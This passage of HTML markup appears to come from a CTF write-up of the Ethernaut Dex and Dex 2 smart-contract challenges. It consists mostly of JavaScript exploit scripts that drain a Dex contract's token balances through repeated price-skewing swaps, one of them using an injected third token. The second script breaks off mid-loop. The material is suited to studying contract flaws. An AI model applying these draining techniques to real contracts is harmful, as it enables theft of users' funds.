</span></span><span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none;color:#6a9955">46</span><span>        </span><span class="token" style="color:#569CD6">const</span><span> toSwap </span><span class="token" style="color:#d4d4d4">=</span><span> </span><span class="token" style="color:#c586c0">await</span><span> </span><span class="token" style="color:#dcdcaa">getSwapValues</span><span class="token" style="color:#d4d4d4">(</span><span>tokenValues</span><span class="token" style="color:#d4d4d4">)</span><span class="token" style="color:#d4d4d4">;</span><span>
</span></span><span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none;color:#6a9955">47</span><span>        </span><span class="token" style="color:#c586c0">await</span><span> contract</span><span class="token" style="color:#d4d4d4">.</span><span class="token method property-access" style="color:#dcdcaa">swap</span><span class="token" style="color:#d4d4d4">(</span><span>tokenValues</span><span class="token" style="color:#d4d4d4">.</span><span class="token property-access">mostExpensiveToken</span><span class="token" style="color:#d4d4d4">,</span><span>tokenValues</span><span class="token" style="color:#d4d4d4">.</span><span class="token property-access">cheapestToken</span><span class="token" style="color:#d4d4d4">,</span><span>toSwap</span><span class="token" style="color:#d4d4d4">,</span><span class="token" style="color:#d4d4d4">{</span><span class="token" style="color:#c586c0">from</span><span class="token" style="color:#d4d4d4">:</span><span class="token" style="color:#9cdcfe">PLAYER</span><span class="token" style="color:#d4d4d4">}</span><span class="token" style="color:#d4d4d4">)</span><span class="token" style="color:#d4d4d4">;</span><span>
</span></span><span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none;color:#6a9955">48</span><span>        </span><span class="token" style="color:#4ec9b0">console</span><span class="token" style="color:#d4d4d4">.</span><span class="token method property-access" style="color:#dcdcaa">log</span><span class="token" style="color:#d4d4d4">(</span><span class="token template-string template-punctuation" style="color:#ce9178">`</span><span class="token template-string" style="color:#ce9178">swapped </span><span class="token template-string" style="color:#569cd6">${</span><span class="token template-string" style="color:#9cdcfe">toSwap</span><span class="token template-string" style="color:#569cd6">}</span><span class="token template-string" style="color:#ce9178"> </span><span class="token template-string" style="color:#569cd6">${</span><span class="token template-string" style="color:#9cdcfe">tokenValues</span><span class="token template-string" style="color:#d4d4d4">.</span><span class="token template-string property-access" style="color:#9cdcfe">mostExpensiveToken</span><span class="token template-string" style="color:#569cd6">}</span><span class="token template-string" style="color:#ce9178"> for  </span><span class="token template-string" style="color:#569cd6">${</span><span class="token template-string" style="color:#9cdcfe">tokenValues</span><span class="token template-string" style="color:#d4d4d4">.</span><span class="token template-string property-access" style="color:#9cdcfe">cheapestToken</span><span class="token template-string" style="color:#569cd6">}</span><span class="token template-string template-punctuation" style="color:#ce9178">`</span><span class="token" style="color:#d4d4d4">)</span><span class="token" style="color:#d4d4d4">;</span><span>
</span></span><span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none;color:#6a9955">49</span>
</span><span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none;color:#6a9955">50</span><span>        flag </span><span class="token" style="color:#d4d4d4">=</span><span> token1Balance</span><span class="token" style="color:#d4d4d4">*</span><span>token2Balance</span><span class="token" style="color:#d4d4d4">&gt;</span><span class="token" style="color:#b5cea8">0</span><span class="token" style="color:#d4d4d4">;</span><span>
</span></span><span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none;color:#6a9955">51</span><span>    </span><span class="token" style="color:#d4d4d4">}</span><span>
</span></span><span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none;color:#6a9955">52</span>    
</span><span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none;color:#6a9955">53</span><span>    </span><span class="token" style="color:#4ec9b0">console</span><span class="token" style="color:#d4d4d4">.</span><span class="token method property-access" style="color:#dcdcaa">log</span><span class="token" style="color:#d4d4d4">(</span><span class="token" style="color:#ce9178">&quot;Hacked !&quot;</span><span class="token" style="color:#d4d4d4">)</span><span>
</span></span><span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none;color:#6a9955">54</span><span></span><span class="token" style="color:#d4d4d4">}</span><span>
</span></span><span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none;color:#6a9955">55</span>
</span><span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none;color:#6a9955">56</span>
</span><span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none;color:#6a9955">57</span><span>module</span><span class="token" style="color:#d4d4d4">.</span><span class="token method-variable function-variable method property-access" style="color:#dcdcaa">exports</span><span> </span><span class="token" style="color:#d4d4d4">=</span><span> </span><span class="token" style="color:#569CD6">async</span><span>  </span><span class="token" style="color:#569CD6">function</span><span class="token" style="color:#d4d4d4">(</span><span class="token" style="color:#9cdcfe">deployer</span><span class="token" style="color:#d4d4d4">)</span><span> </span><span class="token" style="color:#d4d4d4">{</span><span>
</span></span><span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none;color:#6a9955">58</span>  
</span><span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none;color:#6a9955">59</span><span>  contract </span><span class="token" style="color:#d4d4d4">=</span><span> </span><span class="token" style="color:#c586c0">await</span><span> contractABI</span><span class="token" style="color:#d4d4d4">.</span><span class="token method property-access" style="color:#dcdcaa">at</span><span class="token" style="color:#d4d4d4">(</span><span class="token" style="color:#ce9178">&quot;0xBa71E2eEF0D68C5aBCDe6dF3EEf9377b9eD9E78C&quot;</span><span class="token" style="color:#d4d4d4">)</span><span class="token" style="color:#d4d4d4">;</span><span> 
</span></span><span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none;color:#6a9955">60</span><span>  </span><span class="token" style="color:#c586c0">await</span><span> </span><span class="token" style="color:#dcdcaa">drainFunds</span><span class="token" style="color:#d4d4d4">(</span><span class="token" style="color:#d4d4d4">)</span><span class="token" style="color:#d4d4d4">;</span><span>
</span></span><span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none;color:#6a9955">61</span><span></span><span class="token" style="color:#d4d4d4">}</span><span class="token" style="color:#d4d4d4">;</span><span>
</span></span><span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none;color:#6a9955">62</span>
</span></code></div></pre>
<p class="chakra-text css-0" node="[object Object]"><div class="chakra-stack css-bwdt07"><div class="chakra-stack css-1pb7l90"><div class="css-1ui0t94"><img src="https://res.cloudinary.com/dsdvvwb8v/image/upload/v1659138023/852281f645c829a2d76b966618bbb6c25f1c4721506ecca9de0e7e6ef4fab42f_dw1jen.png" alt="Dex console" style="scale:1.2px;width:100%"/></div><p class="chakra-text css-1qz7fzr">Dex console</p></div></div></p>
<h2 class="chakra-heading css-1uc67dn" id="dex 2">Dex 2</h2>
<h2 class="chakra-heading css-1uc67dn" id="challenge description">Challenge Description</h2>
<p class="chakra-text css-0" node="[object Object]">Same as Dex v1 but now we need to drain both tokens.</p>
<div class="css-17l36zw"></div>
<p class="chakra-text css-0" node="[object Object]"><span class="chakra-text css-gv9qss">Analysis</span></p>
<p class="chakra-text css-0" node="[object Object]">Same here but we got one less check that makes it possible to inject a third token and thus draining both contract&#x27;s main tokens&#x27; balance.</p>
<p class="chakra-text css-0" node="[object Object]"><div class="chakra-stack css-bwdt07"><div class="chakra-stack css-1pb7l90"><div class="css-1ui0t94"><img src="https://res.cloudinary.com/dsdvvwb8v/image/upload/v1659138024/aeb9bb0ecc92f4b707acbc9170c3bd3355c4361d3523704a799bc8717093366d_ogt3sr.png" alt="Dex 2 Function" style="scale:1.2px;width:100%"/></div><p class="chakra-text css-1qz7fzr">Dex 2 Function</p></div></div></p>
<div class="css-17l36zw"></div>
<p class="chakra-text css-0" node="[object Object]"><span class="chakra-text css-gv9qss">-----
<span class="chakra-text css-gv9qss">Exploitation</span>ation</span></p>
<pre><div class="codeStyle" style="color:#d4d4d4;font-size:13px;text-shadow:none;font-family:Menlo, Monaco, Consolas, &quot;Andale Mono&quot;, &quot;Ubuntu Mono&quot;, &quot;Courier New&quot;, monospace;direction:ltr;text-align:left;white-space:pre;word-spacing:normal;word-break:normal;line-height:1.5;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-hyphens:none;-moz-hyphens:none;-ms-hyphens:none;hyphens:none;padding:1em;margin:.5em 0;overflow:auto;background:#1e1e1e"><code class="language-js" style="color:#d4d4d4;font-size:13px;text-shadow:none;font-family:Menlo, Monaco, Consolas, &quot;Andale Mono&quot;, &quot;Ubuntu Mono&quot;, &quot;Courier New&quot;, monospace;direction:ltr;text-align:left;white-space:pre;word-spacing:normal;word-break:normal;line-height:1.5;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-hyphens:none;-moz-hyphens:none;-ms-hyphens:none;hyphens:none"><span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none;color:#6a9955">1</span><span class="token" style="color:#569CD6">const</span><span> contractABI </span><span class="token" style="color:#d4d4d4">=</span><span> artifacts</span><span class="token" style="color:#d4d4d4">.</span><span class="token method property-access" style="color:#dcdcaa">require</span><span class="token" style="color:#d4d4d4">(</span><span class="token" style="color:#ce9178">&quot;Dex&quot;</span><span class="token" style="color:#d4d4d4">)</span><span class="token" style="color:#d4d4d4">;</span><span>
</span></span><span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none;color:#6a9955">2</span>
</span><span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none;color:#6a9955">3</span><span></span><span class="token" style="color:#569CD6">let</span><span> contract </span><span class="token" style="color:#d4d4d4">;</span><span>
</span></span><span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none;color:#6a9955">4</span><span></span><span class="token" style="color:#569CD6">let</span><span> </span><span class="token" style="color:#9cdcfe">TOKEN1_ADDRESS</span><span> </span><span class="token" style="color:#d4d4d4">=</span><span> </span><span class="token" style="color:#ce9178">&quot;0x954aB18d300D8FFE76a2eFE7B36fcD6EF36825c7&quot;</span><span class="token" style="color:#d4d4d4">;</span><span>
</span></span><span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none;color:#6a9955">5</span><span></span><span class="token" style="color:#569CD6">let</span><span> </span><span class="token" style="color:#9cdcfe">TOKEN2_ADDRESS</span><span> </span><span class="token" style="color:#d4d4d4">=</span><span> </span><span class="token" style="color:#ce9178">&quot;0xE651aD37ac31B03F7B49036248A29DC75D0093E6&quot;</span><span class="token" style="color:#d4d4d4">;</span><span>
</span></span><span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none;color:#6a9955">6</span>
</span><span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none;color:#6a9955">7</span><span></span><span class="token" style="color:#569CD6">const</span><span> </span><span class="token" style="color:#9cdcfe">TOKEN3_ADDRESS</span><span class="token" style="color:#d4d4d4">=</span><span> </span><span class="token" style="color:#ce9178">&quot;0xfe5A0de02e7c76f2A51e3d297e65ccE784787538&quot;</span><span>
</span></span><span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none;color:#6a9955">8</span>
</span><span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none;color:#6a9955">9</span><span></span><span class="token" style="color:#569CD6">let</span><span> </span><span class="token" style="color:#9cdcfe">PLAYER</span><span class="token" style="color:#d4d4d4">=</span><span class="token" style="color:#ce9178">&#x27;0x84e7a3679A82C2766Ff8382862ab883FF9460307&#x27;</span><span>
</span></span><span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none;color:#6a9955">10</span>
</span><span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none;color:#6a9955">11</span><span></span><span class="token" style="color:#569CD6">async</span><span> </span><span class="token" style="color:#569CD6">function</span><span> </span><span class="token" style="color:#dcdcaa">getBalances</span><span class="token" style="color:#d4d4d4">(</span><span class="token" style="color:#d4d4d4">)</span><span class="token" style="color:#d4d4d4">{</span><span>
</span></span><span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none;color:#6a9955">12</span><span>    </span><span class="token" style="color:#569CD6">const</span><span> token1Balance </span><span class="token" style="color:#d4d4d4">=</span><span> </span><span class="token" style="color:#d4d4d4">(</span><span class="token" style="color:#c586c0">await</span><span> contract</span><span class="token" style="color:#d4d4d4">.</span><span class="token method property-access" style="color:#dcdcaa">balanceOf</span><span class="token" style="color:#d4d4d4">(</span><span class="token" style="color:#9cdcfe">TOKEN1_ADDRESS</span><span class="token" style="color:#d4d4d4">,</span><span>contract</span><span class="token" style="color:#d4d4d4">.</span><span class="token property-access">address</span><span class="token" style="color:#d4d4d4">)</span><span class="token" style="color:#d4d4d4">)</span><span class="token" style="color:#d4d4d4">.</span><span class="token method property-access" style="color:#dcdcaa">toNumber</span><span class="token" style="color:#d4d4d4">(</span><span class="token" style="color:#d4d4d4">)</span><span class="token" style="color:#d4d4d4">;</span><span>
</span></span><span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none;color:#6a9955">13</span><span>    </span><span class="token" style="color:#569CD6">const</span><span> token2Balance </span><span class="token" style="color:#d4d4d4">=</span><span> </span><span class="token" style="color:#d4d4d4">(</span><span class="token" style="color:#c586c0">await</span><span> contract</span><span class="token" style="color:#d4d4d4">.</span><span class="token method property-access" style="color:#dcdcaa">balanceOf</span><span class="token" style="color:#d4d4d4">(</span><span class="token" style="color:#9cdcfe">TOKEN2_ADDRESS</span><span class="token" style="color:#d4d4d4">,</span><span>contract</span><span class="token" style="color:#d4d4d4">.</span><span class="token property-access">address</span><span class="token" style="color:#d4d4d4">)</span><span class="token" style="color:#d4d4d4">)</span><span class="token" style="color:#d4d4d4">.</span><span class="token method property-access" style="color:#dcdcaa">toNumber</span><span class="token" style="color:#d4d4d4">(</span><span class="token" style="color:#d4d4d4">)</span><span class="token" style="color:#d4d4d4">;</span><span>
</span></span><span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none;color:#6a9955">14</span><span>    </span><span class="token" style="color:#4ec9b0">console</span><span class="token" style="color:#d4d4d4">.</span><span class="token method property-access" style="color:#dcdcaa">log</span><span class="token" style="color:#d4d4d4">(</span><span class="token template-string template-punctuation" style="color:#ce9178">`</span><span class="token template-string" style="color:#ce9178">Current Balances for contract : A : </span><span class="token template-string" style="color:#569cd6">${</span><span class="token template-string" style="color:#9cdcfe">token1Balance</span><span class="token template-string" style="color:#569cd6">}</span><span class="token template-string" style="color:#ce9178"> \t B : </span><span class="token template-string" style="color:#569cd6">${</span><span class="token template-string" style="color:#9cdcfe">token2Balance</span><span class="token template-string" style="color:#569cd6">}</span><span class="token template-string template-punctuation" style="color:#ce9178">`</span><span class="token" style="color:#d4d4d4">)</span><span class="token" style="color:#d4d4d4">;</span><span>
</span></span><span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none;color:#6a9955">15</span><span>    </span><span class="token" style="color:#c586c0">return</span><span> </span><span class="token" style="color:#d4d4d4">{</span><span>token1Balance</span><span class="token" style="color:#d4d4d4">,</span><span>token2Balance</span><span class="token" style="color:#d4d4d4">}</span><span>
</span></span><span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none;color:#6a9955">16</span><span></span><span class="token" style="color:#d4d4d4">}</span><span>
</span></span><span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none;color:#6a9955">17</span>
</span><span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none;color:#6a9955">18</span><span></span><span class="token" style="color:#569CD6">async</span><span> </span><span class="token" style="color:#569CD6">function</span><span> </span><span class="token" style="color:#dcdcaa">knowTokenValues</span><span class="token" style="color:#d4d4d4">(</span><span class="token" style="color:#d4d4d4">{</span><span class="token" style="color:#9cdcfe">token1Balance</span><span class="token" style="color:#d4d4d4">,</span><span class="token" style="color:#9cdcfe">token2Balance</span><span class="token" style="color:#d4d4d4">}</span><span class="token" style="color:#d4d4d4">)</span><span class="token" style="color:#d4d4d4">{</span><span>
</span></span><span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none;color:#6a9955">19</span><span>    </span><span class="token" style="color:#c586c0">return</span><span> </span><span class="token" style="color:#d4d4d4">{</span><span class="token literal-property" style="color:#9cdcfe">mostExpensiveToken</span><span class="token" style="color:#d4d4d4">:</span><span> token1Balance </span><span class="token" style="color:#d4d4d4">&gt;=</span><span> token2Balance </span><span class="token" style="color:#d4d4d4">?</span><span> </span><span class="token" style="color:#9cdcfe">TOKEN2_ADDRESS</span><span> </span><span class="token" style="color:#d4d4d4">:</span><span> </span><span class="token" style="color:#9cdcfe">TOKEN1_ADDRESS</span><span class="token" style="color:#d4d4d4">,</span><span class="token literal-property" style="color:#9cdcfe">cheapestToken</span><span class="token" style="color:#d4d4d4">:</span><span>token1Balance </span><span class="token" style="color:#d4d4d4">&lt;</span><span> token2Balance </span><span class="token" style="color:#d4d4d4">?</span><span> </span><span class="token" style="color:#9cdcfe">TOKEN2_ADDRESS</span><span> </span><span class="token" style="color:#d4d4d4">:</span><span> </span><span class="token" style="color:#9cdcfe">TOKEN1_ADDRESS</span><span> </span><span class="token" style="color:#d4d4d4">}</span><span class="token" style="color:#d4d4d4">;</span><span>
</span></span><span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none;color:#6a9955">20</span><span></span><span class="token" style="color:#d4d4d4">}</span><span>
</span></span><span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none;color:#6a9955">21</span>
</span><span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none;color:#6a9955">22</span><span></span><span class="token" style="color:#569CD6">async</span><span> </span><span class="token" style="color:#569CD6">function</span><span> </span><span class="token" style="color:#dcdcaa">getSwapValues</span><span class="token" style="color:#d4d4d4">(</span><span class="token" style="color:#9cdcfe">tokensWithValues</span><span class="token" style="color:#d4d4d4">)</span><span class="token" style="color:#d4d4d4">{</span><span>
</span></span><span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none;color:#6a9955">23</span><span>    </span><span class="token" style="color:#569CD6">let</span><span> toSwap  </span><span class="token" style="color:#d4d4d4">=</span><span> </span><span class="token" style="color:#d4d4d4">(</span><span class="token" style="color:#c586c0">await</span><span> contract</span><span class="token" style="color:#d4d4d4">.</span><span class="token method property-access" style="color:#dcdcaa">balanceOf</span><span class="token" style="color:#d4d4d4">(</span><span>tokensWithValues</span><span class="token" style="color:#d4d4d4">.</span><span class="token property-access">mostExpensiveToken</span><span class="token" style="color:#d4d4d4">,</span><span class="token" style="color:#9cdcfe">PLAYER</span><span class="token" style="color:#d4d4d4">)</span><span class="token" style="color:#d4d4d4">)</span><span class="token" style="color:#d4d4d4">.</span><span class="token method property-access" style="color:#dcdcaa">toNumber</span><span class="token" style="color:#d4d4d4">(</span><span class="token" style="color:#d4d4d4">)</span><span class="token" style="color:#d4d4d4">;</span><span>
</span></span><span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none;color:#6a9955">24</span><span>    </span><span class="token" style="color:#569CD6">let</span><span> available </span><span class="token" style="color:#d4d4d4">=</span><span> </span><span class="token" style="color:#d4d4d4">(</span><span class="token" style="color:#c586c0">await</span><span> contract</span><span class="token" style="color:#d4d4d4">.</span><span class="token method property-access" style="color:#dcdcaa">balanceOf</span><span class="token" style="color:#d4d4d4">(</span><span>tokensWithValues</span><span class="token" style="color:#d4d4d4">.</span><span class="token property-access">mostExpensiveToken</span><span class="token" style="color:#d4d4d4">,</span><span>contract</span><span class="token" style="color:#d4d4d4">.</span><span class="token property-access">address</span><span class="token" style="color:#d4d4d4">)</span><span class="token" style="color:#d4d4d4">)</span><span class="token" style="color:#d4d4d4">.</span><span class="token method property-access" style="color:#dcdcaa">toNumber</span><span class="token" style="color:#d4d4d4">(</span><span class="token" style="color:#d4d4d4">)</span><span class="token" style="color:#d4d4d4">;</span><span>
</span></span><span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none;color:#6a9955">25</span>
</span><span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none;color:#6a9955">26</span><span>    </span><span class="token" style="color:#6a9955">// making sure at the end when we get most of balance in one token type we can still get the rest of the tokens.</span><span>
</span></span><span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none;color:#6a9955">27</span><span>    </span><span class="token" style="color:#c586c0">if</span><span class="token" style="color:#d4d4d4">(</span><span>toSwap</span><span class="token" style="color:#d4d4d4">&gt;</span><span>available</span><span class="token" style="color:#d4d4d4">)</span><span>toSwap</span><span class="token" style="color:#d4d4d4">=</span><span>available</span><span class="token" style="color:#d4d4d4">;</span><span>
</span></span><span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none;color:#6a9955">28</span>
</span><span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none;color:#6a9955">29</span><span>    </span><span class="token" style="color:#c586c0">return</span><span> toSwap</span><span class="token" style="color:#d4d4d4">;</span><span>
</span></span><span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none;color:#6a9955">30</span><span></span><span class="token" style="color:#d4d4d4">}</span><span>
</span></span><span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none;color:#6a9955">31</span>
</span><span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none;color:#6a9955">32</span>
</span><span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none;color:#6a9955">33</span><span></span><span class="token" style="color:#569CD6">async</span><span> </span><span class="token" style="color:#569CD6">function</span><span> </span><span class="token" style="color:#dcdcaa">drainFunds</span><span class="token" style="color:#d4d4d4">(</span><span class="token" style="color:#d4d4d4">)</span><span class="token" style="color:#d4d4d4">{</span><span>
</span></span><span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none;color:#6a9955">34</span>    
</span><span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none;color:#6a9955">35</span><span>    </span><span class="token" style="color:#569CD6">let</span><span> flag</span><span class="token" style="color:#d4d4d4">=</span><span class="token" style="color:#569cd6">true</span><span class="token" style="color:#d4d4d4">;</span><span>
</span></span><span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none;color:#6a9955">36</span><span>    </span><span class="token" style="color:#c586c0">await</span><span> contract</span><span class="token" style="color:#d4d4d4">.</span><span class="token method property-access" style="color:#dcdcaa">approve</span><span class="token" style="color:#d4d4d4">(</span><span>contract</span><span class="token" style="color:#d4d4d4">.</span><span class="token property-access">address</span><span class="token" style="color:#d4d4d4">,</span><span class="token" style="color:#b5cea8">10000</span><span class="token" style="color:#d4d4d4">,</span><span class="token" style="color:#d4d4d4">{</span><span class="token" style="color:#c586c0">from</span><span class="token" style="color:#d4d4d4">:</span><span class="token" style="color:#9cdcfe">PLAYER</span><span class="token" style="color:#d4d4d4">}</span><span class="token" style="color:#d4d4d4">)</span><span class="token" style="color:#d4d4d4">;</span><span>
</span></span><span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none;color:#6a9955">37</span><span>    </span><span class="token" style="color:#c586c0">while</span><span class="token" style="color:#d4d4d4">(</span><span>flag</span><span class="token" style="color:#d4d4d4">)</span><span class="token" style="color:#d4d4d4">{</span><span>
</span></span><span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none;color:#6a9955">38</span><span>        </span><span class="token" style="color:#569CD6">const</span><span> balances</span><span class="token" style="color:#d4d4d4">=</span><span> </span><span class="token" style="color:#c586c0">await</span><span> </span><span class="token" style="color:#dcdcaa">getBalances</span><span class="token" style="color:#d4d4d4">(</span><span class="token" style="color:#d4d4d4">)</span><span class="token" style="color:#d4d4d4">;</span><span>
</span></span><span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none;color:#6a9955">39</span><span>        </span><span class="token" style="color:#569CD6">const</span><span> tokenValues</span><span class="token" style="color:#d4d4d4">=</span><span> </span><span class="token" style="color:#c586c0">await</span><span> </span><span class="token" style="color:#dcdcaa">knowTokenValues</span><span class="token" style="color:#d4d4d4">(</span><span>balances</span><span class="token" style="color:#d4d4d4">)</span><span class="token" style="color:#d4d4d4">;</span><span>
</span></span><span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none;color:#6a9955">40</span><span>        </span><span class="token" style="color:#569CD6">const</span><span> toSwap </span><span class="token" style="color:#d4d4d4">=</span><span> </span><span class="token" style="color:#c586c0">await</span><span> </span><span class="token" style="color:#dcdcaa">getSwapValues</span><span class="token" style="color:#d4d4d4">(</span><span>tokenValues</span><span class="token" style="color:#d4d4d4">)</span><span class="token" style="color:#d4d4d4">;</span><span>
</span></span><span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none;color:#6a9955">41</span><span>        </span><span class="token" style="color:#c586c0">await</span><span> contract</span><span class="token" style="color:#d4d4d4">.</span><span class="token method property-access" style="color:#dcdcaa">swap</span><span class="token" style="color:#d4d4d4">(</span><span>tokenValues</span><span class="token" style="color:#d4d4d4">.</span><span class="token property-access">mostExpensiveToken</span><span class="token" style="color:#d4d4d4">,</span><span>tokenValues</span><span class="token" style="color:#d4d4d4">.</span><span class="token property-access">cheapestToken</span><span class="token" style="color:#d4d4d4">,</span><span>toSwap</span><span class="token" style="color:#d4d4d4">,</span><span class="token" style="color:#d4d4d4">{</span><span class="token" style="color:#c586c0">from</span><span class="token" style="color:#d4d4d4">:</span><span class="token" style="color:#9cdcfe">PLAYER</span><span class="token" style="color:#d4d4d4">}</span><span class="token" style="color:#d4d4d4">)</span><span class="token" style="color:#d4d4d4">;</span><span>
</span></span><span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none;color:#6a9955">42</span><span>        </span><span class="token" style="color:#4ec9b0">console</span><span class="token" style="color:#d4d4d4">.</span><span class="token method property-access" style="color:#dcdcaa">log</span><span class="token" style="color:#d4d4d4">(</span><span class="token template-string template-punctuation" style="color:#ce9178">`</span><span class="token template-string" style="color:#ce9178">swapped </span><span class="token template-string" style="color:#569cd6">${</span><span class="token template-string" style="color:#9cdcfe">toSwap</span><span class="token template-string" style="color:#569cd6">}</span><span class="token template-string" style="color:#ce9178"> </span><span class="token template-string" style="color:#569cd6">${</span><span class="token template-string" style="color:#9cdcfe">tokenValues</span><span class="token template-string" style="color:#d4d4d4">.</span><span class="token template-string property-access" style="color:#9cdcfe">mostExpensiveToken</span><span class="token template-string" style="color:#569cd6">}</span><span class="token template-string" style="color:#ce9178"> for  </span><span class="token template-string" style="color:#569cd6">${</span><span class="token template-string" style="color:#9cdcfe">tokenValues</span><span class="token template-string" style="color:#d4d4d4">.</span><span class="token template-string property-access" style="color:#9cdcfe">cheapestToken</span><span class="token template-string" style="color:#569cd6">}</span><span class="token template-string template-punctuation" style="color:#ce9178">`</span><span class="token" style="color:#d4d4d4">)</span><span class="token" style="color:#d4d4d4">;</span><span>
